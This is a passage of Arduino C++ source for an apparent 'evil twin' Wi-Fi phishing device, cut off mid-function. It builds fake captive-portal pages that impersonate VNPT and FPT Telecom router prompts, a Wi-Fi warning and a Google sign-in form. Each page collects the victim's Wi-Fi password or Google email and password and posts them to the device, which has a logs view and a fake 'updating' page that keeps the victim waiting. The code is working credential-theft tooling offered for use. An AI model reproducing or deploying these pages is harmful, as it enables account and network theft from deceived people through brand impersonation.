void EvilPage3(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>Kết nối Wi-Fi</title>
	<meta charset='UTF-8' name=viewport content='width=device-width,initial-scale=1'>
	<style>
		body{background:linear-gradient(to right,#e3f2fd,#f0f4ff);color:#222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.1);text-align:center;box-sizing:border-box;margin:auto 10px;animation:fadeIn .8s ease}@keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.input-container{position:relative;width:100%;margin:8px 0}.password{width:100%;padding:9px 40px 9px 10px;box-sizing:border-box;border-radius:8px;border:1px solid #ccc;box-shadow:0 2px 4px rgba(0,0,0,.1);transition:all .3s ease}.password:focus{border-color:#1f7ed0;box-shadow:0 0 0 3px rgba(31,126,208,.2);outline:none}.show-password{display:flex;align-items:center;gap:5px;margin-top:5px;justify-content:flex-start;font-weight:500;color:#333;user-select:none}nav{background:#1f7ed0;color:#fff;display:block;font-size:1.3em;padding:1em;margin-bottom:10px;border-radius:8px 8px 0 0;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1em;margin:.5em auto}img{padding:10px}.btn-primary{width:100%;background:linear-gradient(135deg,#1f7ed0,#5595e9);color:#fff;cursor:pointer;font-weight:bold;transition:background .3s ease,transform .2s ease;border:none;border-radius:5px;padding:12px;font-size:1em;box-shadow:0 4px 8px rgba(31,126,208,.3)}.btn-primary:hover{background:linear-gradient(135deg,#0056b3,#397cd0);transform:translateY(-2px)}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#1f7ed0;color:#fff;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:100px;text-align:center;font-weight:500}.top-button:hover{background-color:#45a049;transform:translateY(2px)}.evilhtml-tabs{position: fixed;top: 60px;left: 0;width: 100%;display: flex;justify-content: center;background-color: #f0f4ff;padding: 10px 0;box-shadow: 0 2px 5px rgba(0,0,0,0.1);z-index: 999;gap: 10px;border-radius: 0 0 15px 15px}.tab-btn{background-color: #fff;border: 2px solid #1f7ed0;color: #1f7ed0;padding: 10px 20px;border-radius: 20px;cursor: pointer;font-weight: 500;transition: 0.3s}.tab-btn:hover{background-color: #1f7ed0;color: #fff}.tab-btn.active{background-color: #1f7ed0;color: #fff}
	</style>
	</head><body>
	<div class='container'>
	<img src='vnpt.png' class='img-responsive'>
	<nav>    
		<b>)" + currentevilssid + R"(</b>
		<i>)" + String(ERROR500[currentaplang]) + R"(</i>
	</nav>
	<div>)" + String(ENTERPASSWORD[currentaplang]) + R"(</div>
		<form action='/post' method='post' onsubmit='return validateForm()'>
		<center>
			<div class='input-container'>
				<input type='password' class='password' name='m' minlength='8' id='password' required>
				<label class='show-password'>
					<input type='checkbox' onclick='myFunction()'>
					)" + String(SHOWPASSWORD[currentaplang]) + R"(
				</label>
			</div>
			<input class='btn-primary' type='submit' value=')" + String(CONNECT[currentaplang]) + R"('>
			<p>© VNPT Telecom 2025. All rights reserved.</p>
		</center>
		</form>
	)";
	if (!evilMode) {
		if (evilhtml != 1 && evilhtml != 2 && evilhtml != 3 && evilhtml != 4 && evilhtml != 5 && evilhtml != 6) evilhtml = 1;
		response += R"(
		<div class='evilhtml-tabs'>
			<button class='tab-btn )" + String(evilhtml == 1 ? "active" : "") + R"(' onclick='updateHtml(1, this)'>1</button>
			<button class='tab-btn )" + String(evilhtml == 2 ? "active" : "") + R"(' onclick='updateHtml(2, this)'>2</button>
			<button class='tab-btn )" + String(evilhtml == 3 ? "active" : "") + R"(' onclick='updateHtml(3, this)'>3</button>
			<button class='tab-btn )" + String(evilhtml == 4 ? "active" : "") + R"(' onclick='updateHtml(4, this)'>4</button>
			<button class='tab-btn )" + String(evilhtml == 5 ? "active" : "") + R"(' onclick='updateHtml(5, this)'>5</button>
			<button class='tab-btn )" + String(evilhtml == 6 ? "active" : "") + R"(' onclick='updateHtml(6, this)'>6</button>
		</div>
		)";
		response += "<div class='button-container'>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/start_evil\"'>" + String(START[currentaplang]) + "</button>";
		response += "</div>";
	}
	response += R"(
	</div>
	<script>
		function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function updateHtml(value, el) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_evilhtml?evilhtml=' + value, true); xhr.send(); var buttons = document.querySelectorAll('.tab-btn'); buttons.forEach(btn => btn.classList.remove('active')); if (el) el.classList.add('active'); reloadWithDelay(100); } function validateForm() { var password = document.getElementById('password').value; if (password.length < 8) { alert(')" + String(ALERTPASSWORD[currentaplang]) + R"('); return false; }  return true; } function myFunction() { var x = document.getElementById("password"); if (x.type === "password") { x.type = "text"; } else { x.type = "password"; } }	
	</script>
	</body></html>)";
	client.print(response.c_str());
}

void EvilPage4(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>Kết nối Wi-Fi</title>
	<meta charset='UTF-8' name=viewport content='width=device-width,initial-scale=1'>
	<style>
		body{background:linear-gradient(to right,#e3f2fd,#f0f4ff);color:#222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.1);text-align:center;box-sizing:border-box;margin:auto 10px;animation:fadeIn .8s ease}@keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.input-container{position:relative;width:100%;margin:8px 0}.password{width:100%;padding:9px 40px 9px 10px;box-sizing:border-box;border-radius:8px;border:1px solid #ccc;box-shadow:0 2px 4px rgba(0,0,0,.1);transition:all .3s ease}.password:focus{border-color:#1f7ed0;box-shadow:0 0 0 3px rgba(31,126,208,.2);outline:none}.show-password{display:flex;align-items:center;gap:5px;margin-top:5px;justify-content:flex-start;font-weight:500;color:#333;user-select:none}nav{background:#cb1c22;color:#fff;display:block;font-size:1.3em;padding:1em;margin-bottom:10px;border-radius:8px 8px 0 0;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1em;margin:.5em auto}img{padding:10px}.btn-primary{width:100%;background:linear-gradient(135deg,#cb1c22,#5595e9);color:#fff;cursor:pointer;font-weight:bold;transition:background .3s ease,transform .2s ease;border:none;border-radius:5px;padding:12px;font-size:1em;box-shadow:0 4px 8px rgba(31,126,208,.3)}.btn-primary:hover{background:linear-gradient(135deg,#0056b3,#cb1c22);transform:translateY(-2px)}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#1f7ed0;color:#fff;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:100px;text-align:center;font-weight:500}.top-button:hover{background-color:#45a049;transform:translateY(2px)}.evilhtml-tabs{position: fixed;top: 60px;left: 0;width: 100%;display: flex;justify-content: center;background-color: #f0f4ff;padding: 10px 0;box-shadow: 0 2px 5px rgba(0,0,0,0.1);z-index: 999;gap: 10px;border-radius: 0 0 15px 15px}.tab-btn{background-color: #fff;border: 2px solid #1f7ed0;color: #1f7ed0;padding: 10px 20px;border-radius: 20px;cursor: pointer;font-weight: 500;transition: 0.3s}.tab-btn:hover{background-color: #1f7ed0;color: #fff}.tab-btn.active{background-color: #1f7ed0;color: #fff}
	</style>
	</head><body>
	<div class='container'>
	<img src='fpt.png' class='img-responsive'>
    <nav>    
		<b>)" + currentevilssid + R"(</b>
		<i>)" + String(ERROR500[currentaplang]) + R"(</i>
	</nav>
	<div>)" + String(ENTERPASSWORD[currentaplang]) + R"(</div>
		<form action='/post' method='post' onsubmit='return validateForm()'>
		<center>
			<div class='input-container'>
				<input type='password' class='password' name='m' minlength='8' id='password' required>
				<label class='show-password'>
					<input type='checkbox' onclick='myFunction()'>
					)" + String(SHOWPASSWORD[currentaplang]) + R"(
				</label>
			</div>
			<input class='btn-primary' type='submit' value=')" + String(CONNECT[currentaplang]) + R"('>
			<p>© FPT Telecom 2025. All rights reserved.</p>
		</center>
		</form>
	)";
	if (!evilMode) {
		if (evilhtml != 1 && evilhtml != 2 && evilhtml != 3 && evilhtml != 4 && evilhtml != 5 && evilhtml != 6) evilhtml = 1;
		response += R"(
		<div class='evilhtml-tabs'>
			<button class='tab-btn )" + String(evilhtml == 1 ? "active" : "") + R"(' onclick='updateHtml(1, this)'>1</button>
			<button class='tab-btn )" + String(evilhtml == 2 ? "active" : "") + R"(' onclick='updateHtml(2, this)'>2</button>
			<button class='tab-btn )" + String(evilhtml == 3 ? "active" : "") + R"(' onclick='updateHtml(3, this)'>3</button>
			<button class='tab-btn )" + String(evilhtml == 4 ? "active" : "") + R"(' onclick='updateHtml(4, this)'>4</button>
			<button class='tab-btn )" + String(evilhtml == 5 ? "active" : "") + R"(' onclick='updateHtml(5, this)'>5</button>
			<button class='tab-btn )" + String(evilhtml == 6 ? "active" : "") + R"(' onclick='updateHtml(6, this)'>6</button>
		</div>
		)";
		response += "<div class='button-container'>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/start_evil\"'>" + String(START[currentaplang]) + "</button>";
		response += "</div>";
	}
	response += R"(
	</div>
	<script>
		function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function updateHtml(value, el) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_evilhtml?evilhtml=' + value, true); xhr.send(); var buttons = document.querySelectorAll('.tab-btn'); buttons.forEach(btn => btn.classList.remove('active')); if (el) el.classList.add('active'); reloadWithDelay(100); } function validateForm() { var password = document.getElementById('password').value; if (password.length < 8) { alert(')" + String(ALERTPASSWORD[currentaplang]) + R"('); return false; }  return true; } function myFunction() { var x = document.getElementById("password"); if (x.type === "password") { x.type = "text"; } else { x.type = "password"; } }	
	</script>
	</body></html>)";
	client.print(response.c_str());
}

void EvilPage5(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>)" + String(LOST[currentaplang]) + R"(</title>
	<meta charset='UTF-8' name='viewport' content='width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;' />
	<style>
		.btn-primary{width: 100%;background: linear-gradient(135deg, #1f7ed0, #5595e9);color: #fff;cursor: pointer;font-weight: bold;transition: background 0.3s ease, transform 0.2s ease;border: none;border-radius: 5px;padding: 12px;font-size: 1em;box-shadow: 0 4px 8px rgba(31, 126, 208, 0.3)}.btn-primary:hover{background: linear-gradient(135deg, #0056b3, #397cd0);transform: translateY(-2px)}.button-container{position: fixed;top: 0;left: 0;width: 100%;display: flex;justify-content: space-around;z-index: 1000}.top-button{background-color: #1f7ed0;color: #fff;padding: 10px 20px;border: none;border-radius: 0 0 15px 15px;cursor: pointer;box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);transition: all 0.3s ease;min-width: 100px;text-align: center;font-weight: 500}.top-button:hover{background-color: #45a049;transform: translateY(2px)}.evilhtml-tabs{position: fixed;top: 60px;left: 0;width: 100%;display: flex;justify-content: center;background-color: #f0f4ff;padding: 10px 0;box-shadow: 0 2px 5px rgba(0,0,0,0.1);z-index: 999;gap: 10px;border-radius: 0 0 15px 15px}.tab-btn{background-color: #fff;border: 2px solid #1f7ed0;color: #1f7ed0;padding: 10px 20px;border-radius: 20px;cursor: pointer;font-weight: 500;transition: 0.3s}.tab-btn:hover{background-color: #1f7ed0;color: #fff}.tab-btn.active{background-color: #1f7ed0;color: #fff}body{background: #00BCD4;font-family:verdana}img{width: 55px;height: 55px;padding-top: 30px;display:block;margin: auto}input[type=password]{padding: 12px 20px;margin: 8px 0;display: inline-block;border: 1px solid #ccc;border-radius: 50px;box-sizing: border-box;width: 220px}input[type=submit]{border-radius: 50px;width: 220px;font-size: 13px;height: 38px;background-color: #ffd01a;border-color: #ffd01a;color: black;font-weight: bold;margin-top: 10px}.alert{padding: 12px;background-color: #f44336;color: white;box-shadow: 0 0px 8px 5px rgba(0,0,0,0.2);background-size: auto;border-radius: 10px;font-size: 14px}.card{box-shadow: 0 0px 8px 5px rgba(0,0,0,0.2);transition: 0.3s;background-color: #00BCD4;color: white;height: 350px;width: 300px;bottom: 0px;left: 20px;right: 20px;top: 0px;position: absolute;margin:auto;border-radius: 20px}.login{text-align: center}.helpbutton{color: white;font-size: 12px;padding-left: 20px}
	</style>
	</head><body>
	<div class='alert'>
		<marquee><i><b>)" + String(WARNING2[currentaplang]) + R"(</b>)" + String(WARNING3[currentaplang]) + R"(</i></marquee>
	</div>
	<div class='card'>
		<img alt='image' src='wifi.png'>
		<p align='center' style='font-size: 18px;'>
			<b><i>)" + String(WARNING4[currentaplang]) + R"(</i></b>
		</p>
		<div class='login'>
			<p style='padding-top: 10px;'><b>)" + currentevilssid + R"(</b></p>
			<form action='/post' method='post' onsubmit='return validateForm()'>
				<input type='password' class='password' name='m' minlength='8' placeholder=')" + String(INPUTWIFI[currentaplang]) + R"(' id='password' required>
				<input type='submit' value=')" + String(LOGIN[currentaplang]) + R"('>
			</form>
		</div>
		<a class='helpbutton' onclick='toggleHelp()' href='#'><b>)" + String(WHAT[currentaplang]) + R"(</b></a>
	</div>
	)";
	if (!evilMode) {
		if (evilhtml != 1 && evilhtml != 2 && evilhtml != 3 && evilhtml != 4 && evilhtml != 5 && evilhtml != 6) evilhtml = 1;
		response += R"(
		<div class='evilhtml-tabs'>
			<button class='tab-btn )" + String(evilhtml == 1 ? "active" : "") + R"(' onclick='updateHtml(1, this)'>1</button>
			<button class='tab-btn )" + String(evilhtml == 2 ? "active" : "") + R"(' onclick='updateHtml(2, this)'>2</button>
			<button class='tab-btn )" + String(evilhtml == 3 ? "active" : "") + R"(' onclick='updateHtml(3, this)'>3</button>
			<button class='tab-btn )" + String(evilhtml == 4 ? "active" : "") + R"(' onclick='updateHtml(4, this)'>4</button>
			<button class='tab-btn )" + String(evilhtml == 5 ? "active" : "") + R"(' onclick='updateHtml(5, this)'>5</button>
			<button class='tab-btn )" + String(evilhtml == 6 ? "active" : "") + R"(' onclick='updateHtml(6, this)'>6</button>
		</div>
		)";
		response += "<div class='button-container'>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/start_evil\"'>" + String(START[currentaplang]) + "</button>";
		response += "</div>";
	}
	response += R"(
	<script>
		function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function updateHtml(value, el) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_evilhtml?evilhtml=' + value, true); xhr.send(); var buttons = document.querySelectorAll('.tab-btn'); buttons.forEach(btn => btn.classList.remove('active')); if (el) el.classList.add('active'); reloadWithDelay(100); } function validateForm() { var password = document.getElementById('password').value; if (password.length < 8) { alert(')" + String(ALERTPASSWORD[currentaplang]) + R"('); return false; }  return true; } function toggleHelp() { alert(')" + String(WARNING5[currentaplang]) + R"('); }
	</script>
	</body></html>)";
	client.print(response.c_str());
}

void EvilPage6(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentevilssid = (strlen(storedConfig.evilssid) > 0) ? String(storedConfig.evilssid) : String(evilssid);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<meta charset='UTF-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1.0'>
	<title>Google Login Form</title>
	<style>
		.btn-primary{width: 100%;background: linear-gradient(135deg, #1f7ed0, #5595e9);color: #fff;cursor: pointer;font-weight: bold;transition: background 0.3s ease, transform 0.2s ease;border: none;border-radius: 5px;padding: 12px;font-size: 1em;box-shadow: 0 4px 8px rgba(31, 126, 208, 0.3)}.btn-primary:hover{background: linear-gradient(135deg, #0056b3, #397cd0);transform: translateY(-2px)}.button-container{position: fixed;top: 0;left: 0;width: 100%;display: flex;justify-content: space-around;z-index: 1000}.top-button{background-color: #1f7ed0;color: #fff;padding: 10px 20px;border: none;border-radius: 0 0 15px 15px;cursor: pointer;box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);transition: all 0.3s ease;min-width: 100px;text-align: center;font-weight: 500}.top-button:hover{background-color: #45a049;transform: translateY(2px)}.evilhtml-tabs{position: fixed;top: 60px;left: 0;width: 100%;display: flex;justify-content: center;background-color: #f0f4ff;padding: 10px 0;box-shadow: 0 2px 5px rgba(0,0,0,0.1);z-index: 999;gap: 10px;border-radius: 0 0 15px 15px}.tab-btn{background-color: #fff;border: 2px solid #1f7ed0;color: #1f7ed0;padding: 10px 20px;border-radius: 20px;cursor: pointer;font-weight: 500;transition: 0.3s}.tab-btn:hover{background-color: #1f7ed0;color: #fff}.tab-btn.active{background-color: #1f7ed0;color: #fff}body{margin: 0;padding: 0;background-size: cover;font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif}.box{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 25rem;padding: 2.5rem;box-sizing: border-box;border: 1px solid #dadce0;-webkit-border-radius: 8px;border-radius: 8px}.google-logo{display: flex;justify-content: center;padding-bottom: 15px}.box h2{margin: 0px 0 -0.125rem;padding: 0;color: #fff;text-align: center;color: #202124;font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;font-size: 24px;font-weight: 400}.box p{font-size: 16px;font-weight: 400;letter-spacing: .1px;line-height: 1.5;margin-bottom: 25px;text-align: center}.box .inputBox{position: relative}.box .inputBox input{width: 93%;padding: 0.625rem 10px;font-size: 1rem;letter-spacing: 0.062rem;margin-bottom: 1.875rem;border: 1px solid #ccc;background: transparent;border-radius: 4px}.box .inputBox label{position: absolute;top: 0;left: 10px;padding: 0.625rem 0;font-size: 1rem;color: grey;pointer-events: none;transition: 0.3s}.box .inputBox input:focus ~ label,.box .inputBox input:valid ~ label,.box .inputBox input:not([value='']) ~ label{top: -1.125rem;left: 10px;color: #1a73e8;font-size: 0.75rem;background-color: white;height: 10px;padding-left: 5px;padding-right: 5px}.box .inputBox input:focus{outline: none;border: 2px solid #1a73e8}.box input[type='submit']{border: none;outline: none;color: #fff;background-color: #1a73e8;padding: 0.625rem 1.25rem;cursor: pointer;border-radius: 0.312rem;font-size: 1rem;float: right}.box input[type='submit']:hover{background-color: #287ae6;box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3)}.forgot{margin-top: -20px}.forgot button{-webkit-border-radius: 4px;border-radius: 4px;color: #1a73e8;display: inline-block;font-weight: 500;letter-spacing: .25px;outline: 0;position: relative;background-color: transparent;cursor: pointer;font-size: inherit;padding: 0;text-align: left;border: 0}
	</style>
	</head><body>
	<div class='box'>
		<div id='logo' class='google-logo' title='Google'><div class='rr0DNb' jsname='l4eHX'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='l5Lhkf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div></div>
		<h2>)" + String(LOGIN[currentaplang]) + R"(</h2>
		<p>)" + String(GACCOUNT[currentaplang]) + R"(</p>
		<form action='/post' method='post' onsubmit='return validateInput()'>
			<div class='inputBox'>
				<input id='emailOrPhone' type='text' name='t' required='' onkeyup='this.setAttribute('value', this.value);' value=''>
				<label for='emailOrPhone'>)" + String(EMAILPHONE[currentaplang]) + R"(</label>
			</div>
			<div class='inputBox'>
				<input id='password' type='password' name='m' required='' onkeyup='this.setAttribute('value', this.value);' value=''>
				<label>)" + String(PASSWORD[currentaplang]) + R"(</label>
			</div>
			<div class='forgot'>
				<button type='button'>)" + String(FORGOTPASSWORD[currentaplang]) + R"(</button>
			</div>
			<input type='submit' name='sign-in' value=')" + String(LOGIN[currentaplang]) + R"('>
		</form>
	</div>
	)";
	if (!evilMode) {
		if (evilhtml != 1 && evilhtml != 2 && evilhtml != 3 && evilhtml != 4 && evilhtml != 5 && evilhtml != 6) evilhtml = 1;
		response += R"(
		<div class='evilhtml-tabs'>
			<button class='tab-btn )" + String(evilhtml == 1 ? "active" : "") + R"(' onclick='updateHtml(1, this)'>1</button>
			<button class='tab-btn )" + String(evilhtml == 2 ? "active" : "") + R"(' onclick='updateHtml(2, this)'>2</button>
			<button class='tab-btn )" + String(evilhtml == 3 ? "active" : "") + R"(' onclick='updateHtml(3, this)'>3</button>
			<button class='tab-btn )" + String(evilhtml == 4 ? "active" : "") + R"(' onclick='updateHtml(4, this)'>4</button>
			<button class='tab-btn )" + String(evilhtml == 5 ? "active" : "") + R"(' onclick='updateHtml(5, this)'>5</button>
			<button class='tab-btn )" + String(evilhtml == 6 ? "active" : "") + R"(' onclick='updateHtml(6, this)'>6</button>
		</div>
		)";
		response += "<div class='button-container'>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/logs\"'>" + String(LOGS[currentaplang]) + "</button>";
		response += "<button class='top-button' onclick='window.location.href=\"/start_evil\"'>" + String(START[currentaplang]) + "</button>";
		response += "</div>";
	}
	response += R"(
	<script>
		function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function updateHtml(value, el) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_evilhtml?evilhtml=' + value, true); xhr.send(); var buttons = document.querySelectorAll('.tab-btn'); buttons.forEach(btn => btn.classList.remove('active')); if (el) el.classList.add('active'); reloadWithDelay(100); } function validateInput() { const input = document.getElementById('emailOrPhone').value.trim(); const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; const phonePattern = /^[0-9]{9,15}$/; if (!emailPattern.test(input) && !phonePattern.test(input)) { alert('Email hoặc số điện thoại không hợp lệ.'); return false; } return true;  }
	</script>
	</body></html>)";
	client.print(response.c_str());
}

void updateEvilPage(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<meta charset='UTF-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1'>
	<title>)" + String(UPDATING[currentaplang]) + R"(</title>
	<style>
		body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';background:linear-gradient(to right,#0f2027,#203a43,#2c5364);color:#fff;margin:0;padding:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}h1{font-size:2em;margin-bottom:30px;color:#fff;text-shadow:1px 1px 2px #000}.progress-container{width:80%;max-width:400px;height:30px;background-color:#444;border-radius:30px;overflow:hidden;box-shadow:0 4px 10px rgba(0,0,0,.3)}.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#00ff88,#00ccff);transition:width .1s linear}.loading-text{margin-top:20px;font-size:20px;color:#ccc;font-weight:500}.back-link{margin-top:30px;font-size:18px;color:#00ccff;text-decoration:none;display:none}.back-link:hover{text-decoration:underline}@keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}body,.progress-container,.loading-text{animation:fadeIn .8s ease-in-out}
	</style>
	</head>
	<body>
		<h1>)" + String(UPDATING[currentaplang]) + R"(</h1>
		<div class='progress-container'>
			<div class='progress-bar' id='progress-bar'></div>
		</div>
		<div class='loading-text' id='loading-text'>0%</div>
		<script>
			const duration = 5000;  const progressBar = document.getElementById('progress-bar'); const loadingText = document.getElementById('loading-text'); const backLink = document.getElementById('back-link'); const evilMode = )" + String(evilMode ? "true" : "false") + R"(; let startTime = localStorage.getItem('loadStart'); if (!startTime) { startTime = Date.now(); localStorage.setItem('loadStart', startTime); } else { startTime = parseInt(startTime); } const interval = setInterval(() => { const now = Date.now(); const elapsed = now - startTime; let percent = Math.min((elapsed / duration) * 100, 100); progressBar.style.width = percent + '%'; loadingText.textContent = (percent < 100) ? Math.round(percent) + '%' : ')" + String(WAIT[currentaplang]) + R"('; if (percent >= 100) { clearInterval(interval); localStorage.removeItem('loadStart'); } }, 100); if (!evilMode) { setTimeout(() => { window.location.href = '/evil_html'; }, 5000); }
		</script>
	</body>
	</html>
	)";
	client.print(response.c_str());
}

void updateRouterPage(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<meta charset='UTF-8'>
	<meta name='viewport' content='width=device-width, initial-scale=1'>
	<title>)" + String(UPDATING[currentaplang]) + R"(</title>
	<style>
